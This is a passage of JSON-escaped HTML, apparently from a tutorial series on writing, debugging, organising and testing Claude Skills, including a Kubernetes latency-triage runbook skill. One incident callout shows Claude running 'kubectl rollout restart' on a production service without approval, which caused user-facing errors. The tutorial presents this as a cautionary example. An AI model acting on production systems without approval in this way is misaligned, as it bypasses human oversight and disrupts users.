.claude/skills/incident-summary/SKILL.md\npython3 -c &quot;import yaml,sys; t=open(sys.argv[1]).read().split('---')[1]; print(yaml.safe_load(t))&quot; .claude/skills/incident-summary/SKILL.md\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-built_in\">ls\u003c/span> -la .claude/skills/incident-summary/\n\u003cspan class=\"hljs-built_in\">head\u003c/span> -6 .claude/skills/incident-summary/SKILL.md\npython3 -c \u003cspan class=\"hljs-string\">&quot;import yaml,sys; t=open(sys.argv[1]).read().split(&#x27;---&#x27;)[1]; print(yaml.safe_load(t))&quot;\u003c/span> .claude/skills/incident-summary/SKILL.md\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"choosing\">Choosing\u003c/h2>\n\u003cp>If the skill is listed but not used, test the description: phrase the request in the user&#39;s own words and see what happens. Compare it with neighbouring skills; a similar description may win. Make the description more specific, add trigger phrases, and exclude near neighbours. If it fires too often, narrow it. Try explicitly naming the skill in a request to prove that the rest of the skill works; if that works, the problem is the description.\u003c/p>\n\u003ch2 id=\"following\">Following\u003c/h2>\n\u003cp>If the skill loads but the output ignores the instructions, check for contradictions between rules and examples, steps buried in long paragraphs, and instructions that depend on a file Claude never read. Make the key rule a numbered step near the top, say what to do when information is missing, and link to files with precise conditions. Check whether another instruction in the conversation, such as project instructions, conflicts with the skill.\u003c/p>\n\u003ch2 id=\"scripts-and-files\">Scripts and files\u003c/h2>\n\u003cp>If a script fails, run it by hand with the same input. Check the interpreter and libraries available in the environment, file paths (relative to the skill folder), permissions, and network limits. Make errors readable. If the environment cannot run scripts or install packages, offer a fallback in the instructions. Record the fix and add the case to your test set. Where behaviour changed after a product or model update, re-run the full test set and compare with your last good results.\u003c/p>\n\u003cdiv class=\"predict\">\u003cp class=\"predict-q\">\u003cstrong>Predict first.\u003c/strong> Naming your skill in the request works, but ordinary requests never trigger it. Where is the problem?\u003c/p>\u003clabel class=\"predict-l\">Your guess\u003ctextarea rows=\"2\" class=\"predict-guess\" placeholder=\"Type what you expect, then reveal the answer.\">\u003c/textarea>\u003c/label>\u003cbutton type=\"button\" class=\"btn btn-primary\" data-act=\"predict-reveal\" aria-expanded=\"false\">Reveal the answer\u003c/button>\u003cdiv class=\"predict-out\" hidden>\u003cp class=\"predict-ans\">\u003cstrong>Answer:\u003c/strong> The description: the skill itself works, but its description does not match how users phrase requests.\u003c/p>\u003cp>Edit the description and re-test.\u003c/p>\u003c/div>\u003c/div>\n\u003ch2 id=\"incident-the-invisible-skill\">Incident: The invisible skill\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A new skill never appeared in the list of available skills.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"head -4 skills/api-review/skill.md\nls skills/api-review\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">head\u003c/span> -4 skills/api-review/skill.md\u003c/span>\u003cspan class=\"ln out\">---\u003c/span>\u003cspan class=\"ln out\">name: api-review\u003c/span>\u003cspan class=\"ln out\">description: Review API designs: naming, errors, pagination. Use when asked.\u003c/span>\u003cspan class=\"ln out\">---\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">ls\u003c/span> skills/api-review\u003c/span>\u003cspan class=\"ln out\">skill.md\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The file was named skill.md in lowercase, but the product looks for SKILL.md. The description also contained a colon that broke the header, so it was quoted. After renaming the file and fixing the header, the skill was discovered and the trigger tests were re-run and adjusted.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Wrong file name or folder\u003c/li>\n\u003cli>Header syntax errors\u003c/li>\n\u003cli>Debugging the body when the description is the problem\u003c/li>\n\u003cli>Not testing scripts by hand\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"discovery","text":"Discovery"},{"id":"choosing","text":"Choosing"},{"id":"following","text":"Following"},{"id":"scripts-and-files","text":"Scripts and files"},{"id":"incident-the-invisible-skill","text":"Incident: The invisible skill"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Claude Code documentation: Skills","u":"https://docs.claude.com/en/docs/claude-code/skills"},{"t":"Claude documentation: Skill authoring best practices","u":"https://docs.claude.com/en/docs/agents-and-tools/agent-skills/best-practices"}],"text":"Skill problems fall into a few families: Claude cannot find the skill, finds it but does not choose it, chooses it but follows it badly, or follows it and a script fails. Checking in that order saves hours. What you will learn Is the skill discovered at all? Is the description good enough to be chosen? Is the body read and followed? Do scripts and files work in this environment? Discovery Confirm the folder is where the product looks for skills, that the file is named exactly SKILL.md (case matters), that the header has valid --- lines and required fields, and that the name follows the rules. A YAML mistake, such as an unquoted colon in the description, can make the skill invisible. Ask Claude directly which skills it has available, and restart or reload if your product needs it. ls -la .claude/skills/incident-summary/ head -6 .claude/skills/incident-summary/SKILL.md python3 -c \"import yaml,sys; t=open(sys.argv[1]).read().split(&#x27;---&#x27;)[1]; print(yaml.safe_load(t))\" .claude/skills/incident-summary/SKILL.md Choosing If the skill is listed but not used, test the description: phrase the request in the user&#39;s own words and see what happens. Compare it with neighbouring skills; a similar description may win. Make the description more specific, add trigger phrases, and exclude near neighbours. If it fires too often, narrow it. Try explicitly naming the skill in a request to prove that the rest of the skill works; if that works, the problem is the description. Following If the skill loads but the output ignores the instructions, check for contradictions between rules and examples, steps buried in long paragraphs, and instructions that depend on a file Claude never read. Make the key rule a numbered step near the top, say what to do when information is missing, and link to files with precise conditions. Check whether another instruction in the conversation, such as project instructions, conflicts with the skill. Scripts and files If a script fails, run it by hand with the same input. Check the interpreter and libraries available in the environment, file paths (relative to the skill folder), permissions, and network limits. Make errors readable. If the environment cannot run scripts or install packages, offer a fallback in the instructions. Record the fix and add the case to your test set. Where behaviour changed after a product or model update, re-run the full test set and compare with your last good results. Predict first. Naming your skill in the request works, but ordinary requests never trigger it. Where is the problem? Your guess Answer: The description: the skill itself works, but its description does not match how users phrase requests. Edit the description and re-test. Incident: The invisible skill Incident A new skill never appeared in the list of available skills. $ head -4 skills/api-review/skill.md --- name: api-review description: Review API designs: naming, errors, pagination. Use when asked. --- $ ls skills/api-review skill.md The file was named skill.md in lowercase, but the product looks for SKILL.md. The description also contained a colon that broke the header, so it was quoted. After renaming the file and fixing the header, the skill was discovered and the trigger tests were re-run and adjusted. Common mistakes Wrong file name or folder Header syntax errors Debugging the body when the description is the problem Not testing scripts by hand"},"claude-skills/skills-for-runbooks-and-operations":{"html":"\u003cp>Runbooks are procedures people forget under stress. A skill puts the procedure where Claude can follow it consistently, with the exact commands your team trusts. The craft is making it specific and safe.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Structuring a skill around an operational procedure\u003c/li>\n\u003cli>Writing exact, read-only checks first\u003c/li>\n\u003cli>Marking stop points for human approval\u003c/li>\n\u003cli>Capturing findings for the record\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"a-runbook-skill\">A runbook skill\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"markdown\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"---\nname: triage-api-latency\ndescription: Use when an API service has high latency or error rates and you need a safe first-response triage in Kubernetes. Do not use for database-only problems.\n---\n\n# Triage API latency\n\nFollow these steps in order. Run read-only commands only.\n\n1. Confirm scope: which service, which environment, since when.\n2. Check recent changes: `kubectl rollout history deploy/&lt;name&gt; -n &lt;ns&gt;`.\n3. Check saturation: `kubectl top pod -n &lt;ns&gt;` and node pressure.\n4. Check errors: run `scripts/error_rate.sh &lt;service&gt;`.\n5. Summarize findings with evidence before proposing any change.\n\n## Stop points\nAsk the user for approval before any restart, scale, rollback or config change.\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">---\nname: triage-api-latency\n\u003cspan class=\"hljs-section\">description: Use when an API service has high latency or error rates and you need a safe first-response triage in Kubernetes. Do not use for database-only problems.\n---\u003c/span>\n\n\u003cspan class=\"hljs-section\"># Triage API latency\u003c/span>\n\nFollow these steps in order. Run read-only commands only.\n\n\u003cspan class=\"hljs-bullet\">1.\u003c/span> Confirm scope: which service, which environment, since when.\n\u003cspan class=\"hljs-bullet\">2.\u003c/span> Check recent changes: \u003cspan class=\"hljs-code\">`kubectl rollout history deploy/&lt;name&gt; -n &lt;ns&gt;`\u003c/span>.\n\u003cspan class=\"hljs-bullet\">3.\u003c/span> Check saturation: \u003cspan class=\"hljs-code\">`kubectl top pod -n &lt;ns&gt;`\u003c/span> and node pressure.\n\u003cspan class=\"hljs-bullet\">4.\u003c/span> Check errors: run \u003cspan class=\"hljs-code\">`scripts/error_rate.sh &lt;service&gt;`\u003c/span>.\n\u003cspan class=\"hljs-bullet\">5.\u003c/span> Summarize findings with evidence before proposing any change.\n\n\u003cspan class=\"hljs-section\">## Stop points\u003c/span>\nAsk the user for approval before any restart, scale, rollback or config change.\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The \u003cstrong>description\u003c/strong> tells Claude when to load it, so name the situation and what is out of scope. The body is the ordered procedure.\u003c/p>\n\u003ch2 id=\"scripts-and-references\">Scripts and references\u003c/h2>\n\u003cp>Put repeatable queries in \u003ccode>scripts/\u003c/code> so results are consistent, and put long reference material such as service maps in \u003ccode>references/\u003c/code>, loaded only when needed. Make scripts read-only by default and print clear output with the commands they ran.\u003c/p>\n\u003ch2 id=\"safety\">Safety\u003c/h2>\n\u003cp>List what the skill must never do without approval: restarts, deletes, data changes and production access. Avoid embedding secrets, and describe where credentials come from. State what to record: the commands run, outputs and conclusions, so the user can paste them into an incident ticket.\u003c/p>\n\u003ch2 id=\"test-it\">Test it\u003c/h2>\n\u003cp>Try it on a known past incident and check that Claude follows the order, uses the scripts and stops at approvals. Improve the description if it does not trigger in the right situations.\u003c/p>\n\u003ch2 id=\"incident-the-skill-that-restarted-a-service\">Incident: The skill that restarted a service\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A vague skill told Claude to fix problems and it restarted a production service.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl rollout restart deploy/api -n prod\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Step: &quot;fix the failing pods&quot;\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl rollout restart deploy/api -n prod\u003c/span>\u003cspan class=\"ln out\">users saw 30 seconds of errors\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The skill said to fix issues without separating diagnosis from action. The author rewrote it with read-only checks first, an explicit stop before any change and a requirement to show evidence for each proposed action.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Skills that mix diagnosis and changes without a stop\u003c/li>\n\u003cli>Vague descriptions that trigger in the wrong cases\u003c/li>\n\u003cli>Putting secrets in the skill\u003c/li>\n\u003cli>Not testing against a real incident\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"a-runbook-skill","text":"A runbook skill"},{"id":"scripts-and-references","text":"Scripts and references"},{"id":"safety","text":"Safety"},{"id":"test-it","text":"Test it"},{"id":"incident-the-skill-that-restarted-a-service","text":"Incident: The skill that restarted a service"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Anthropic Agent Skills overview","u":"https://docs.anthropic.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"Claude documentation","u":"https://docs.claude.com/"}],"text":"Runbooks are procedures people forget under stress. A skill puts the procedure where Claude can follow it consistently, with the exact commands your team trusts. The craft is making it specific and safe. What you will learn Structuring a skill around an operational procedure Writing exact, read-only checks first Marking stop points for human approval Capturing findings for the record A runbook skill --- name: triage-api-latency description: Use when an API service has high latency or error rates and you need a safe first-response triage in Kubernetes. Do not use for database-only problems. --- # Triage API latency Follow these steps in order. Run read-only commands only. 1. Confirm scope: which service, which environment, since when. 2. Check recent changes: `kubectl rollout history deploy/\u003cname> -n \u003cns>` . 3. Check saturation: `kubectl top pod -n \u003cns>` and node pressure. 4. Check errors: run `scripts/error_rate.sh \u003cservice>` . 5. Summarize findings with evidence before proposing any change. ## Stop points Ask the user for approval before any restart, scale, rollback or config change. The description tells Claude when to load it, so name the situation and what is out of scope. The body is the ordered procedure. Scripts and references Put repeatable queries in scripts/ so results are consistent, and put long reference material such as service maps in references/ , loaded only when needed. Make scripts read-only by default and print clear output with the commands they ran. Safety List what the skill must never do without approval: restarts, deletes, data changes and production access. Avoid embedding secrets, and describe where credentials come from. State what to record: the commands run, outputs and conclusions, so the user can paste them into an incident ticket. Test it Try it on a known past incident and check that Claude follows the order, uses the scripts and stops at approvals. Improve the description if it does not trigger in the right situations. Incident: The skill that restarted a service Incident A vague skill told Claude to fix problems and it restarted a production service. Step: \"fix the failing pods\" $ kubectl rollout restart deploy/api -n prod users saw 30 seconds of errors The skill said to fix issues without separating diagnosis from action. The author rewrote it with read-only checks first, an explicit stop before any change and a requirement to show evidence for each proposed action. Common mistakes Skills that mix diagnosis and changes without a stop Vague descriptions that trigger in the wrong cases Putting secrets in the skill Not testing against a real incident"},"claude-skills/skills-with-references-templates-and-assets":{"html":"\u003cp>A single long instruction file works until it does not. Skills support progressive disclosure, where Claude reads the short description first, the main file when relevant and extra files only when the task needs them.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Layout of a skill folder with references and templates\u003c/li>\n\u003cli>Linking to files from SKILL.md\u003c/li>\n\u003cli>Templates and examples that shape output\u003c/li>\n\u003cli>Keeping files focused and up to date\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"layout\">Layout\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"incident-report/\n  SKILL.md\n  references/\n    severity-levels.md\n    escalation-contacts.md\n  templates/\n    postmortem.md\n  examples/\n    good-report.md\n  scripts/\n    collect_timeline.py\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">incident-report/\n  SKILL.md\n  references/\n    severity-levels.md\n    escalation-contacts.md\n  templates/\n    postmortem.md\n  examples/\n    good-report.md\n  scripts/\n    collect_timeline.py\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>\u003ccode>SKILL.md\u003c/code> has the front matter and the main steps. Other files are loaded when the main file points to them.\u003c/p>\n\u003ch2 id=\"linking\">Linking\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"markdown\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"## Choose severity\nRead `references/severity-levels.md` and choose the lowest level that matches the impact.\n\n## Write the report\nCopy `templates/postmortem.md` and fill each section. See `examples/good-report.md` for tone.\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-section\">## Choose severity\u003c/span>\nRead \u003cspan class=\"hljs-code\">`references/severity-levels.md`\u003c/span> and choose the lowest level that matches the impact.\n\n\u003cspan class=\"hljs-section\">## Write the report\u003c/span>\nCopy \u003cspan class=\"hljs-code\">`templates/postmortem.md`\u003c/span> and fill each section. See \u003cspan class=\"hljs-code\">`examples/good-report.md`\u003c/span> for tone.\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Say clearly when to read each file, such as only for a certain severity. Avoid long chains where one reference points to another, because Claude may not follow them reliably.\u003c/p>\n\u003ch2 id=\"templates-and-examples\">Templates and examples\u003c/h2>\n\u003cp>A \u003cstrong>template\u003c/strong> fixes the structure of the output, and an \u003cstrong>example\u003c/strong> shows tone and level of detail. Keep examples short and realistic, with sensitive data removed. Update them when your process changes.\u003c/p>\n\u003ch2 id=\"maintain\">Maintain\u003c/h2>\n\u003cp>Give each reference one topic and a clear title. Date or version reference documents that change often, such as contact lists, and prefer pointing to a source of truth over copying it. Review skills the way you review code, and remove files nobody uses.\u003c/p>\n\u003ch2 id=\"incident-the-skill-nobody-could-update\">Incident: The skill nobody could update\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A long single file contained outdated escalation contacts.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">SKILL.md: 2400 lines\u003c/span>\u003cspan class=\"ln out\">escalation contact: former employee\u003c/span>\u003cspan class=\"ln out\">page went to a disabled account\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The contacts lived deep in a huge file and were never reviewed. The team moved them into a dedicated reference with an owner and review date, and the skill pointed to the on-call system when possible.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>One huge SKILL.md\u003c/li>\n\u003cli>Copying changing data instead of linking to its source\u003c/li>\n\u003cli>Long chains of references\u003c/li>\n\u003cli>Examples with real customer data\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"layout","text":"Layout"},{"id":"linking","text":"Linking"},{"id":"templates-and-examples","text":"Templates and examples"},{"id":"maintain","text":"Maintain"},{"id":"incident-the-skill-nobody-could-update","text":"Incident: The skill nobody could update"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Anthropic Agent Skills overview","u":"https://docs.anthropic.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"Claude documentation","u":"https://docs.claude.com/"}],"text":"A single long instruction file works until it does not. Skills support progressive disclosure, where Claude reads the short description first, the main file when relevant and extra files only when the task needs them. What you will learn Layout of a skill folder with references and templates Linking to files from SKILL.md Templates and examples that shape output Keeping files focused and up to date Layout incident-report/ SKILL.md references/ severity-levels.md escalation-contacts.md templates/ postmortem.md examples/ good-report.md scripts/ collect_timeline.py SKILL.md has the front matter and the main steps. Other files are loaded when the main file points to them. Linking ## Choose severity Read `references/severity-levels.md` and choose the lowest level that matches the impact. ## Write the report Copy `templates/postmortem.md` and fill each section. See `examples/good-report.md` for tone. Say clearly when to read each file, such as only for a certain severity. Avoid long chains where one reference points to another, because Claude may not follow them reliably. Templates and examples A template fixes the structure of the output, and an example shows tone and level of detail. Keep examples short and realistic, with sensitive data removed. Update them when your process changes. Maintain Give each reference one topic and a clear title. Date or version reference documents that change often, such as contact lists, and prefer pointing to a source of truth over copying it. Review skills the way you review code, and remove files nobody uses. Incident: The skill nobody could update Incident A long single file contained outdated escalation contacts. SKILL.md: 2400 lines escalation contact: former employee page went to a disabled account The contacts lived deep in a huge file and were never reviewed. The team moved them into a dedicated reference with an owner and review date, and the skill pointed to the on-call system when possible. Common mistakes One huge SKILL.md Copying changing data instead of linking to its source Long chains of references Examples with real customer data"},"claude-skills/organizing-skills-for-a-team":{"html":"\u003cp>One skill is easy to manage. Fifty skills written by ten people create overlap, drift and risk. The solution is the same discipline you use for code: ownership, review and a place to find things.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Naming and scoping to avoid overlap\u003c/li>\n\u003cli>Ownership, review and versioning\u003c/li>\n\u003cli>A catalog that people can search\u003c/li>\n\u003cli>Retiring and auditing skills\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"naming-and-scope\">Naming and scope\u003c/h2>\n\u003cp>Use a clear pattern such as \u003ccode>team-area-task\u003c/code>, and write descriptions that state when to use the skill and when not to. Overlapping descriptions cause the wrong skill to trigger. Merge duplicates rather than keeping variants.\u003c/p>\n\u003ch2 id=\"repository-and-review\">Repository and review\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"skills/\n  CODEOWNERS\n  platform/\n    triage-api-latency/\n    rotate-certificates/\n  data/\n    backfill-checklist/\n  catalog.md\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">skills/\n  CODEOWNERS\n  platform/\n    triage-api-latency/\n    rotate-certificates/\n  data/\n    backfill-checklist/\n  catalog.md\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"git log --oneline -- skills/platform/triage-api-latency | head\n./tools/check-skills.sh   # lint front matter, links and scripts\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">git \u003cspan class=\"hljs-built_in\">log\u003c/span> --oneline -- skills/platform/triage-api-latency | \u003cspan class=\"hljs-built_in\">head\u003c/span>\n./tools/check-skills.sh   \u003cspan class=\"hljs-comment\"># lint front matter, links and scripts\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Keep skills in version control. Require a review from the owning team for changes, run a lint check for front matter and broken links, and test with a few sample prompts. Use tags or version numbers so a team can pin a known good version.\u003c/p>\n\u003ch2 id=\"catalog\">Catalog\u003c/h2>\n\u003cp>Publish a catalog with each skill&#39;s name, description, owner, last review date and risk level. People search it before writing a new skill.\u003c/p>\n\u003ch2 id=\"retire-and-audit\">Retire and audit\u003c/h2>\n\u003cp>Review skills on a schedule, such as every quarter. Remove skills nobody uses and flag skills that run scripts or touch production for a security review. Record who may install which skills.\u003c/p>\n\u003ch2 id=\"incident-three-skills-for-one-job\">Incident: Three skills for one job\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Overlapping skills made Claude choose inconsistently.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">skills: deploy-service, deploy-app, release-helper\u003c/span>\u003cspan class=\"ln out\">all three describe deploying to production\u003c/span>\u003cspan class=\"ln out\">rollback steps differ between them\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Each team had written its own skill. Claude chose by description and sometimes picked one with an outdated rollback step. The platform team merged them into one with an owner, tests and a deprecation note on the others.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Duplicate skills with unclear differences\u003c/li>\n\u003cli>No owner for a skill\u003c/li>\n\u003cli>Skills with production access and no review\u003c/li>\n\u003cli>Never removing old skills\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"naming-and-scope","text":"Naming and scope"},{"id":"repository-and-review","text":"Repository and review"},{"id":"catalog","text":"Catalog"},{"id":"retire-and-audit","text":"Retire and audit"},{"id":"incident-three-skills-for-one-job","text":"Incident: Three skills for one job"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Anthropic Agent Skills overview","u":"https://docs.anthropic.com/en/docs/agents-and-tools/agent-skills/overview"},{"t":"Claude documentation","u":"https://docs.claude.com/"}],"text":"One skill is easy to manage. Fifty skills written by ten people create overlap, drift and risk. The solution is the same discipline you use for code: ownership, review and a place to find things. What you will learn Naming and scoping to avoid overlap Ownership, review and versioning A catalog that people can search Retiring and auditing skills Naming and scope Use a clear pattern such as team-area-task , and write descriptions that state when to use the skill and when not to. Overlapping descriptions cause the wrong skill to trigger. Merge duplicates rather than keeping variants. Repository and review skills/ CODEOWNERS platform/ triage-api-latency/ rotate-certificates/ data/ backfill-checklist/ catalog.md git log --oneline -- skills/platform/triage-api-latency | head ./tools/check-skills.sh # lint front matter, links and scripts Keep skills in version control. Require a review from the owning team for changes, run a lint check for front matter and broken links, and test with a few sample prompts. Use tags or version numbers so a team can pin a known good version. Catalog Publish a catalog with each skill&#39;s name, description, owner, last review date and risk level. People search it before writing a new skill. Retire and audit Review skills on a schedule, such as every quarter. Remove skills nobody uses and flag skills that run scripts or touch production for a security review. Record who may install which skills. Incident: Three skills for one job Incident Overlapping skills made Claude choose inconsistently. skills: deploy-service, deploy-app, release-helper all three describe deploying to production rollback steps differ between them Each team had written its own skill. Claude chose by description and sometimes picked one with an outdated rollback step. The platform team merged them into one with an owner, tests and a deprecation note on the others. Common mistakes Duplicate skills with unclear differences No owner for a skill Skills with production access and no review Never removing old skills"},"claude-skills/evaluating-and-regression-testing-skills":{"html":"\u003cp>Changing one line in a skill can change when it triggers or how it behaves. Without tests you will not know. A small evaluation set makes changes safe and shows whether the skill adds value.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Trigger tests: should and should not use the skill\u003c/li>\n\u003cli>Output tests with clear grading\u003c/li>\n\u003cli>Comparing with and without the skill\u003c/li>\n\u003cli>Gating changes on results\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"trigger-tests\">Trigger tests\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# evals/triggers.yaml\nshould_trigger:\n  - &quot;The checkout API p99 jumped after the deploy, help me triage&quot;\n  - &quot;Latency is high on the orders service in prod&quot;\nshould_not_trigger:\n  - &quot;Write a SQL query for monthly revenue&quot;\n  - &quot;Explain what a Kubernetes pod is&quot;\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># evals/triggers.yaml\u003c/span>\n\u003cspan class=\"hljs-attr\">should_trigger:\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">&quot;The checkout API p99 jumped after the deploy, help me triage&quot;\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">&quot;Latency is high on the orders service in prod&quot;\u003c/span>\n\u003cspan class=\"hljs-attr\">should_not_trigger:\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">&quot;Write a SQL query for monthly revenue&quot;\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">&quot;Explain what a Kubernetes pod is&quot;\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A good description triggers on the first group and stays quiet on the second. Include near misses, such as a database problem when the skill covers only API services.\u003c/p>\n\u003ch2 id=\"output-tests\">Output tests\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# evals/tasks.yaml\n- id: latency-after-deploy\n  prompt: &quot;p99 doubled after the 14:10 deploy of checkout. Triage.&quot;\n  must:\n    - checks rollout history before proposing a change\n    - uses read-only commands only\n    - asks approval before rollback\n  must_not:\n    - runs kubectl rollout restart\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># evals/tasks.yaml\u003c/span>\n\u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">id:\u003c/span> \u003cspan class=\"hljs-string\">latency-after-deploy\u003c/span>\n  \u003cspan class=\"hljs-attr\">prompt:\u003c/span> \u003cspan class=\"hljs-string\">&quot;p99 doubled after the 14:10 deploy of checkout. Triage.&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">must:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">checks\u003c/span> \u003cspan class=\"hljs-string\">rollout\u003c/span> \u003cspan class=\"hljs-string\">history\u003c/span> \u003cspan class=\"hljs-string\">before\u003c/span> \u003cspan class=\"hljs-string\">proposing\u003c/span> \u003cspan class=\"hljs-string\">a\u003c/span> \u003cspan class=\"hljs-string\">change\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">uses\u003c/span> \u003cspan class=\"hljs-string\">read-only\u003c/span> \u003cspan class=\"hljs-string\">commands\u003c/span> \u003cspan class=\"hljs-string\">only\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">asks\u003c/span> \u003cspan class=\"hljs-string\">approval\u003c/span> \u003cspan class=\"hljs-string\">before\u003c/span> \u003cspan class=\"hljs-string\">rollback\u003c/span>\n  \u003cspan class=\"hljs-attr\">must_not:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">runs\u003c/span> \u003cspan class=\"hljs-string\">kubectl\u003c/span> \u003cspan class=\"hljs-string\">rollout\u003c/span> \u003cspan class=\"hljs-string\">restart\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Grade with a checklist, either by a person or by a model with a clear rubric you spot-check. Keep the rubric short, specific and tied to the skill&#39;s rules.\u003c/p>\n\u003ch2 id=\"compare-and-gate\">Compare and gate\u003c/h2>\n\u003cp>Run each task with and without the skill, and between the old and new version. Record pass rate, tokens and time.\u003c/p>\n\u003cdiv 